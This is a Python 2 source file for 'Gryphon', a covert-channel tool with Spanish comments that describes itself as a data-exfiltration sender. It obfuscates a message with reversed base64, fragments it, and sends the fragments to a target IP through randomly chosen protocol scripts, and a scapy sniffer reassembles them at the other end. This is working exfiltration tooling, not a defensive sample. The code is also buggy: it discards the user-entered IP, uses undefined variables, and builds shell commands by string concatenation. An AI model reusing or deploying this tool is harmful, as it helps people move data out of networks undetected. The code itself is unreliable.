#!/usr/bin/python
# -*- coding: utf-8 -*-
# Gryphon . Undercover channel information sender .... just because data exfiltration is fun

import logging, os, base64, sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from os import listdir, getcwd, system


def banner (ifc,ip,key):
	#Presentacion y pantalla principal del programa
	while True:
		print"      8888 "
		print"     :8888 "
		print"     `8888 "
		print"     `8888. 			.██████╗ ██████╗ ██╗   ██╗██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗	"
		print"      Y888.			██╔════╝ ██╔══██╗╚██╗ ██╔╝██╔══██╗██║  ██║██╔═══██╗████╗  ██║ "
		print"     b 888;			██║  ███╗██████╔╝ ╚████╔╝ ██████╔╝███████║██║   ██║██╔██╗ ██║ "
		print"     8.:888.			██║   ██║██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║ "
		print"     8.:888.			██║   ██║██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║ "
		print"     :8.:88b			╚██████╔╝██║  ██║   ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║ "
		print"     :88. 88b			╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ "
		print"      888.:88b."
		print"      `Y8;`888                               The Undercover Messenger"
		print"      :b `8b`888o "
		print"       88o Yb`888b "
		print"       :88b. b:8888."
		print"        `888o b88888b "
		print"        ,  88o8d88oY88.     `Y8o.                ,8888bo "
		print"        :8o  8bY888b:88b      888888888888b.    Y8;   Y8		Interface: " + ifc
		print"         888o`8b8888b`888.     `Y88888888 d88ooo.       88	Objective: "+ip
		print"         Y888b`8888888`Y88b        88888P: Y8888888o    88	Key: "+key
		print"          `888b`8888888. 88b     d8888888888P´´´  ``  d8;"
		print"          b.` 8bY8888888o`Y8b.  d888`888888. ooo.  ,oo88"
		print"          Y88o. 888888888b.Y8b :8888:888888bo.`8888888888 "
		print"          o`Y8bd88888Y8888.Y8od8Y88:88888888bo  88888`'"
		print"          :bo ` 888888'Y8888 Y888.Y8'88888' ``` `88' "
		print"            888od888888'8888;`8888.Yb'888 "
		print"          :b ` 88888888b`8888 88:88o`Y888				1=> Send a Message"
		print"          :88boo.Y888888.Y888 88;8888o Y8.			2=> Run Receiver"
		print"          :8888888888888;:888;88;P:'888o`8."
		print"          :P ,oooo 888888:888 88'8d8.`888oY.			3=> Exit"
		print""
		print"                                      WWW.FWHIBBIT.ES - 2017  - by Nebu_73"

		#codigo del menu

			# solicituamos una opción al usuario
		opcionMenu = raw_input("Elige una opcion entre las disponibles >> ")
		if opcionMenu=="1":
			typ=1
			protos=Conection_Proof(ifc,ip,key,typ)
			enviado=Sender(ifc,ip,key,protos)
			print enviado
		elif opcionMenu=="2":
			typ=0
			protos=Conection_Proof(ifc,ip,key,typ)
			Receptor(ifc,ip,key,protos)
		elif opcionMenu=="3":
			print "Saliendo del programa. no olvides visitar  FWHIBBIT.ES ;P"
			break
		else:
			print ""
			input("No has pulsado ninguna opción correcta...\npulsa una tecla para continuar")



def Conection_Data (itf="eth0",ip="127.0.0.1",key="Und3"):
		#Seleccionamos la interfaz con la que vamos a trabajar
	itf=raw_input("Introduce la interfaz a usar: ")
		#Establecemos el receptor de nuestros paquetes.
	objIP=raw_input("Introduce la IP: ")
		# Establecemos una clave de filtrado para evitar que nos entren todos los mensajes ICMP con el receptor
	key=raw_input("Introduce la clave de filtrado de 4 caracteres: ")
	return itf,ip,key
	clear

def Conection_Proof(itf,ip,key,typ):
	#Con esta funcion vamos a comprobar de todos los protocolos disponibles cuales
	#funcionan para este caso  para ello vamos a recorrer todos los archivos de la
	#carpeta en la que estamos situados y a comprobar si son los que necesitamos
	#los cuales empiezan por PROTO
	protos1=listdir(getcwd())
	long=0
	for i in protos1:
		if i.startswith("PROTOS")==False:
			del protos1[long]
			if typ ==0:
				continue
		else:
			#Ejecutamos cada uno de los scripts constructores de
			#paquetes para enviar un solo paquete y esperamos una
			#respuesta si es positiva lo mantenemos si es negativa
			#lo borramos del listado
			payload="12345678"
			os.system("python "+ i + " 1 " + str(ip)+ " "+str(ift)+" "+str(key)+" " + payload)
			if os.path.isfile("aux.txt"):
				e=open("aux.txt","r")
				proof=e.read()
				if proof==0:
					del protos[i]
			else:
				"Lo sentimos pero ha ocurrido algo inesperado"
		long=long+1
	return protos1


def Sender (itf,ip,key,protos):
	data=raw_input("Introduce el Mensaje a enviar => ")
	#damos la vuelta al string y lo codificamos en BASE64
	data=data[::-1]
	data=base64.b64encode(data)
	data=data[::-1]
	#Establecemos el tamaño del mensaje dentro del paquete permitiendo que lo fragmente
	msgsize= 12
	first=0
	last=(msgsize)
	count=(len(data)/msgsize)+1

#Generamos un bucle que va a ir fragmentando el mensaje para su envio

	for a in range (0,count):
		b=a+1
		payload=str(key)+"_"+str(b)+"_"+str(count)+"_"+data[first:last]
		payload=base64.b64encode(payload)
		payload=payload[::-1]
		print "Enviando fragmento " +str(b)+ " de "+ str(count) +" ..."+payload
		# Ensamblamos el paquete
		# Utilizanoo el listado de posibles protocolos y seleccionamos uno
		#de forma aleatoria
		protocolo=protos[random.randint(0,len(protos)-1)]
		#Creamos el paquete con el protocolo aleatorio
		pkt=os.system("python "+ str(protocolo)+ " 1 " + str(ip)+ " "+str(ift)+" "+str(key)+" " + payload)
		first+=msgsize
		last += msgsize
	return "Datos enviados"

def Receptor(ifc,ip,key,protos):
	if os.path.isfile("Datos.txt"): #Esta linea comprueba si existe o no
		os.remove ("Datos.txt")
	z=open("Datos.txt","a")
	print str(ifc)+"/n"+str(ip)+"/n"+str(key)+"/n"+str()+"/n"+str(protos)
	z.write(str(ifc)+'\n')
	z.write(str(ip)+'\n')
	z.write(str(key)+'\n')
	z.write(str(protos)+'\n')
	z.close()
	pkts = sniff(iface=ifc, prn=monitor)


def monitor(pkt):
    #Vamos a filtrar primero por los protocolos de los que disponemos los modulos
	print "Analizando un paquete..."
	typ=0
	#sacamos el listado de protocolos disponibles
	z=open("Datos.txt","r")
	ifc=z.readline()
	ip=z.readline()
	key=z.readline()
	protos=z.readline()
	z.close()
	protos=Conection_Proof(ifc,ip,key,typ)
	#Limpiamos el listado para poder crear los filtros de busqueda en los paquetes:
	proto1=proto_parser(protos)
	for i in proto1:
		if i in pkt:
			print str(pkt)
			os.system("python "+ str(protos[i])+ " 0 "+" "+ str(ip)+" "+str(ifc)+" "+str(key)+" Monitor"+ pkt)
			f=open("aux.txt","r")
			aux_data=f.read()
			aux_data=aux_data.partition("_")
			num_paq=aux_data[0]
			tot_paq=aux_data[2]
			os.remove ("aux.txt")
			if num_paq == tot_paq:
				"Mensaje Completado"
				f=open(recieved.txt,"r")
				mensaje=f.read()
				mensaje=mensaje[::-1]
				mensaje=base64.b64decode(mensaje)
				mensaje=mensaje[::-1]
				print "El mensaje Recibido es:"
				#print mensaje
				#print "====> %s", mensaje
				print "====> " + str(mensaje)
				f.close()
				sys.exit()


def proto_parser(protos):
	for i in protos:
		aux=i.partition("PROTOS-")
		aux=aux[1].partition(".py")
		i=aux[0]
	return protos

# Establecemos el MAIN de nuestro programa desde el cual ejecutaremos todas las funciones que iremos creando.
# ==============================MAIN==================================
if __name__ == '__main__':
	#Elimino los archivos generados en anteriores ejecuciones para evitar problemas
	if os.path.isfile("received.txt"): #Esta linea comprueba si existe o no
		os.remove ("received.txt")
	if os.path.isfile("aux.txt"):
		os.remove("aux.txt")
	ift,ip,key =Conection_Data()
	banner(ift,ip,key)
